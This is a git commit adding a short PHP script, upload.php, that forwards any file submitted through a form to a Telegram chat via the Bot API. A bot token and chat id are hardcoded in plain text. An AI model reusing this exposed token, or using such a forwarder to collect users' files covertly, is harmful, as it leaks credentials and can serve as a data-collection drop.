af52f1ee3df7a022496249025aa99e7ecead47e3
cr1ex <119162229+cr1ex@users.noreply.github.com>
2023-02-11 21:25:16 +0500

    Create upload.php

---
+++ upload.php
@@ -0,0 +1,23 @@
+<?php
+  if (isset($_FILES['fileToUpload'])) {
+    $token = "5949193548:AAEybA1tbLvDYa-W5WKe20lTF6WvC7SF2bM";
+    $chat_id = "1045144875";
+    
+    $file = $_FILES['fileToUpload'];
+    $file_path = $file['tmp_name'];
+    $file_name = $file['name'];
+    
+    $curl = curl_init();
+    curl_setopt_array($curl, [
+      CURLOPT_URL => "https://api.telegram.org/bot$token/sendDocument",
+      CURLOPT_POST => true,
+      CURLOPT_POSTFIELDS => [
+        'chat_id' => $chat_id,
+        'document' => curl_file_create($file_path, 'application/octet-stream', $file_name)
+      ],
+      CURLOPT_RETURNTRANSFER => true
+    ]);
+    $response = curl_exec($curl);
+    curl_close($curl);
+  }
+?>
